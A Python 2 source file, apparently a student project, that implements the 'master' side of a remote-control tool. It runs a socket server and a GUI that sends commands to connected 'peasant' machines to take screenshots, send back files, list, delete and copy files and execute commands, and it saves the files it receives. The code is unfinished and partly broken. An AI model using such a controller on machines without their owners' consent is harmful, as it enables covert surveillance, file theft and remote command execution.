# Tal's Mater Class
# Version 5 - 14.2.19

from threading import Thread
from commands import Commands
from server_v5 import Server
from gui_v5 import GUI


class Master(object):
    def __init__(self, ip='0.0.0.0', port=8220, save_dir='received\\', debug=False):
        """
        :param ip: the ip of the master
        :param port: the port of the master socket
        :param debug: debug mode (True-on, False-off)
        """
        # create a server
        self.__server = Server(ip=ip, port=port, connection_callback=self.__handle_new_connection
                               , receiving_callback=self.__handle_receiving, debug=debug)
        # create a gui
        self.__gui = GUI(send_callback=self.__handle_sending, debug=debug)
        # the directory to save all received files
        self.__save_dir = save_dir
        # the number of received files
        self.__file_counter = 0
        # debug mode
        self.__DEBUG = debug

    def __handle_new_connection(self, address):
        """
        Receives from the server a new address that has connected and adding it to the gui.
        :param address: the address of the new client
        :return: nothing, void
        """
        # se the address to be in the format - ip : port
        address = "%s : %s" % (address[0], str(address[1]))
        # add the new address to the gui
        self.__gui.add_connection(address=address)

    def __handle_sending(self, event=None, comboboxes={}, entries=[]):
        """
        Prints the combo-boxes' and entries' values
        :param event: the event - <Button-1>
        :param comboboxes: all the combo-boxes
        :param entries: all the entries
        :return:
        """
        print('------------SEND CALLBACK------------')
        # get the address to send the request
        address = comboboxes['peasant'].get()

        # check if there is an empty address
        if not address:
            # print an error to the gui
            self.__gui.print_output("ERROR: Empty Address.")
            # exit the function - there is no where to send the request
            return

        address = address.split(" ")

        command = comboboxes['command'].get()
        # check if there is an empty command
        if not command:
            self.__gui.print_output("ERROR: Empty Command.")

        # set the address to be in the format of tuple: (str(ip), int(port))
        address = (address[0], int(address[2]))
        # get the command
        command = Commands.command_number(command)
        # get the params
        params = [e.get() for l, e in entries]
        # if debug is on then print them all
        if self.__DEBUG:
            print "sending to <%s : %s> the command %s with those params: %s" % \
                  (address[0], str(address[1]), command, params)
        # get the command's number
        command_number = Commands.command_number(command)
        # combine all the arguments to one message to send to the peasant
        data = command_number + Commands.SEPARATE_CHAR.join(params)
        # send the request throw the server
        self.__server.send(address=address, data=data)

    def __handle_receiving(self, address, data):
        """
        Handling receiving data from the
        :param address: the address of the sending client
        :param data: the data the client have sent
        :return: nothing, void
        """
        # if the debug mode is on, print the received data
        if self.__DEBUG:
            print "received form <%s : %s> the following data: %s" % (address[0], address[1], data)
        # separate the data to command number, params and response
        data = data.split(Commands.SEPARATE_CHAR)
        # get the response
        response = data[-1]
        # get the request
        request = data[:-1]
        # call the handle response
        self.__handle_response(response=response, request=request)

    def __handle_response(self, response, request):
        """
        Handles the response from the peasant according to the request
        :param response: the peasant's response
        :param request: the request we sent to the peasant
        :return: nothing, void
        """
        # TODO: FINISH THIS SHIT BY PROTOCOL (CLIENT SENDING: COMMAND NUMBER(0-9)|RESPONSE)
        # get the command and the
        request_list = request.split(" ")
        command = request_list[0]
        params = request_list[1:]

        if command == 'TAKE_SCREENSHOT':
            print response
        if command == 'SEND_FILE':
            # TODO: SPLIT THE RESPONSE TO GET THE FILE'S TYPE AND THE FILE ITSELF
            # save the file on the local machine
            file_name = 'file'+str(self.__file_counter)
            with open(self.__save_dir+file_name, 'wb') as f:
                f.write(response)
            # increase the number of files
            self.__file_counter += 1
        if command == 'DIR':
            print response
        if command == 'DELETE':
            print response
        if command == 'COPY':
            print response
        if command == 'EXECUTE':
            print response

    def run(self):
        # open the server
        server_thread = Thread(target=self.__server.open)
        # run the gui
        gui_thread = Thread(target=self.__gui.run)

        # wait for the gui to finish
        gui_thread.join()

        # close the server
        self.__server.close()
        # wait for the server to finish (close)
        server_thread.join()


if __name__ == '__main__':
    # create a new master
    master = Master()
    # run the master
    master.run()
